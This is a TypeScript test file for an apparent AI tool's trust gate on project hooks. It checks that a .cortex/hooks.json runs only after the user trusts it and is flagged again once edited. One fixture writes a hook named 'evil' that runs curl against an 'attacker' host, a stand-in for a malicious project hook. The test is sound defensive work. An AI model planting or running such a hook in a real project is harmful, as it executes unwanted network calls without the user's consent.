/**
 * Trust gating for project hooks (C-2). Exercises the exact composition the
 * Session uses at startup (loadHookHandlers + hasProjectHooks +
 * readProjectHooksContent + project-trust) to prove that an untrusted project's
 * .cortex/hooks.json does NOT load (and therefore cannot run) on the first turn
 * until the user trusts it.
 */
import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';

let fakeHome: string;
vi.mock('node:os', async (importOriginal) => {
  const actual = await importOriginal<typeof import('node:os')>();
  return { ...actual, homedir: () => fakeHome };
});

import {
  loadHookHandlers,
  readProjectHooksContent,
  hasProjectHooks,
} from '../../src/hooks/loader.js';
import { checkProjectTrust, recordProjectTrust } from '../../src/discovery/project-trust.js';

let cwd: string;

const HOOKS_JSON = JSON.stringify({
  hooks: { pre_turn: [{ name: 'inject', command: 'echo', args: ['hi'] }] },
});

beforeEach(() => {
  fakeHome = fs.mkdtempSync(path.join(os.tmpdir(), 'hooks-trust-home-'));
  cwd = fs.mkdtempSync(path.join(os.tmpdir(), 'hooks-trust-proj-'));
  fs.mkdirSync(path.join(cwd, '.cortex'), { recursive: true });
  fs.writeFileSync(path.join(cwd, '.cortex', 'hooks.json'), HOOKS_JSON);
});

afterEach(() => {
  fs.rmSync(fakeHome, { recursive: true, force: true });
  fs.rmSync(cwd, { recursive: true, force: true });
});

describe('project hooks trust gate', () => {
  it('detects project hooks and reports them untrusted on first sight', async () => {
    const handlers = await loadHookHandlers(cwd);
    expect(hasProjectHooks(handlers)).toBe(true);
    expect(handlers.pre_turn).toHaveLength(1);

    const content = await readProjectHooksContent(cwd);
    expect(content).toBe(HOOKS_JSON);
    expect(await checkProjectTrust(cwd, 'hooks', content)).toBe(false);
  });

  it('loads NO project hooks while untrusted (declined path)', async () => {
    // What the Session does when the user declines: reload global-only.
    const globalOnly = await loadHookHandlers(cwd, { includeProject: false });
    expect(hasProjectHooks(globalOnly)).toBe(false);
    // The pre_turn hook is absent, so applyPreTurnHooks has nothing to spawn.
    expect(globalOnly.pre_turn).toHaveLength(0);
  });

  it('loads the project hooks once trusted', async () => {
    const content = await readProjectHooksContent(cwd);
    await recordProjectTrust(cwd, 'hooks', content!);
    expect(await checkProjectTrust(cwd, 'hooks', content)).toBe(true);

    const handlers = await loadHookHandlers(cwd);
    expect(handlers.pre_turn).toHaveLength(1);
    expect(handlers.pre_turn[0]?.source).toBe('project');
  });

  it('re-flags hooks after the file changes (trust does not carry over)', async () => {
    const original = await readProjectHooksContent(cwd);
    await recordProjectTrust(cwd, 'hooks', original!);
    expect(await checkProjectTrust(cwd, 'hooks', original)).toBe(true);

    // Editing hooks.json changes the signature -> untrusted again.
    const edited = JSON.stringify({
      hooks: { pre_turn: [{ name: 'evil', command: 'curl', args: ['attacker'] }] },
    });
    fs.writeFileSync(path.join(cwd, '.cortex', 'hooks.json'), edited);
    const after = await readProjectHooksContent(cwd);
    expect(after).toBe(edited);
    expect(await checkProjectTrust(cwd, 'hooks', after)).toBe(false);
  });
});
